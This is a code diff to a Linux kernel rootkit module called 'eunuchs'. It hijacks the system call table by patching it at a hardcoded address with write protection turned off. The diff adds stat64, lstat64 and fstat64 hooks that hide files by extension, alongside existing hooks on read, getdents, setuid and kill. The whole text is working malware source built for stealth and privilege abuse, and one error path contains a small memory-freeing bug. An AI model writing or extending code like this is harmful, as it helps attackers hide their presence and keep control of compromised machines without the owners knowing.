@@ -94,6 +94,7 @@ static unsigned long *sct = 0xc167b180;
 #include <linux/dirent.h>       // directory entries
 #include <linux/list.h>         // linked lists
 #include <linux/cred.h>         // credentials, for suid
+#include <linux/fdtable.h>      // for fcheck_files
 
 /* undef this to disable debug messages/functions */
 #define DEBUG 1
@@ -307,6 +308,8 @@ static typeof(sys_getdents64) *orig_getdents64;
 static typeof(sys_setuid) *orig_setuid;
 static typeof(sys_kill) *orig_kill;
 static typeof(sys_fstat64) *orig_fstat64;
+static typeof(sys_lstat64) *orig_lstat64;
+static typeof(sys_stat64) *orig_stat64;
 /* static typeof(sys_stat) *orig_stat; */
 /* static typeof(sys_lstat) *orig_lstat; */
 
@@ -461,9 +464,77 @@ static asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 
     return res;
 }
 
+/**
+ * lstat64() handler. Should we hide the file from lstat calls?
+ **/
+static asmlinkage int eunuchs_lstat64(const char *filename, struct stat64 __user *statbuf)
+{
+    return eunuchs_file_ext_list_contains(filename) ?
+        -ENOENT :
+        orig_lstat64(filename, statbuf);
+}
+
+/**
+ * stat64() handler. Should we hide the file from stat calls?
+ **/
+static asmlinkage int eunuchs_stat64(const char *filename, struct stat64 __user *statbuf)
+{
+    return eunuchs_file_ext_list_contains(filename) ?
+        -ENOENT :
+        orig_stat64(filename, statbuf);
+}
+
+/**
+ * fstat64() handler(). This is so we can hide a particular file from fstat
+ * commands.
+ *
+ * Getting the full path+filename from a file descriptor is done with code
+ * adapted from
+ * https://stackoverflow.com/questions/8250078/how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module
+ **/
 static asmlinkage int eunuchs_fstat64(unsigned long fd, struct stat64 __user *statbuf)
 {
-    return orig_fstat64(fd, statbuf);
+    char *path = NULL, *tmp = NULL;
+    struct file *f = NULL;
+    struct path *p = NULL;
+    int hidden = 0;
+
+    /* if(!(f = fget(fd))) */
+    spin_lock(&current->files->file_lock);
+    f = fcheck_files(current->files, fd);
+    if(!f)
+    {
+        spin_unlock(&current->files->file_lock);
+        return -ENOENT;
+    }
+
+    p = &f->f_path;
+    path_get(p);
+    spin_unlock(&current->files->file_lock);
+
+    tmp = (char *)__get_free_page(GFP_KERNEL);
+    if(!tmp)
+    {
+        path_put(p);
+        return -ENOMEM;
+    }
+
+    path = d_path(p, tmp, PAGE_SIZE);
+    path_put(p);
+
+    if(IS_ERR(path))
+    {
+        kfree(tmp);
+        return PTR_ERR(path);
+    }
+
+    hidden = eunuchs_file_ext_list_contains(path);
+    if(hidden)
+        debug("hiding file [%s]\n", path);
+
+    free_page((unsigned long)tmp);
+
+    return hidden ? -ENOENT : orig_fstat64(fd, statbuf);
 }
 
 /**
@@ -515,9 +586,7 @@ static void cr0_disable_write()
 }
 
 ////////////////////////////////////////////////////////////////////////////////
-// FILE HIDING
-//
-//   based on process hiding (see below)
+// FILE HIDING LISTS
 
 /**
  * hide_file_by_ext(char *) -
@@ -827,19 +896,23 @@ static int eunuchs_hooks_install(void)
     debug("installing hooks\n");
 
     orig_read = (typeof(sys_read) *)sct[__NR_read];
-    sct[__NR_read] = (void *)&eunuchs_read;
-
     orig_getdents = (typeof(sys_getdents) *)sct[__NR_getdents];
-    sct[__NR_getdents] = (void *)&eunuchs_getdents;
-
     orig_getdents64 = (typeof(sys_getdents64) *)sct[__NR_getdents64];
-    sct[__NR_getdents64] = (void *)&eunuchs_getdents64;
-
+    orig_fstat64 = (typeof(sys_fstat64) *)sct[__NR_fstat64];
+    orig_lstat64 = (typeof(sys_lstat64) *)sct[__NR_lstat64];
+    orig_stat64 = (typeof(sys_stat64) *)sct[__NR_stat64];
     orig_setuid = (typeof(sys_setuid) *)sct[__NR_setuid32];
-    sct[__NR_setuid32] = (void *)&eunuchs_setuid;
-
     orig_kill = (typeof(sys_kill) *)sct[__NR_kill];
+
+    sct[__NR_read] = (void *)&eunuchs_read;
+    sct[__NR_getdents] = (void *)&eunuchs_getdents;
+    sct[__NR_getdents64] = (void *)&eunuchs_getdents64;
+    sct[__NR_fstat64] = (void *)&eunuchs_fstat64;
+    sct[__NR_lstat64] = (void *)&eunuchs_lstat64;
+    sct[__NR_stat64] = (void *)&eunuchs_stat64;
+    sct[__NR_setuid32] = (void *)&eunuchs_setuid;
     sct[__NR_kill] = (void *)&eunuchs_kill;
+
 
     /* orig_stat = (typeof(sys_stat) *)sct[__NR_stat]; */
     /* sct[__NR_stat] = (void *)&eunuchs_stat; */
@@ -860,10 +933,11 @@ static void eunuchs_hooks_remove(void)
     sct[__NR_read] = (void *)orig_read;
     sct[__NR_getdents] = (void *)orig_getdents;
     sct[__NR_getdents64] = (void *)orig_getdents64;
+    sct[__NR_fstat64] = (void *)orig_fstat64;
+    sct[__NR_lstat64] = (void *)orig_lstat64;
+    sct[__NR_stat64] = (void *)orig_stat64;
     sct[__NR_setuid32] = (void *)orig_setuid;
     sct[__NR_kill] = (void *)orig_kill;
-    /* sct[__NR_stat] = (void *)orig_stat; */
-    /* sct[__NR_lstat] = (void *)orig_lstat; */
 }
 
 /**
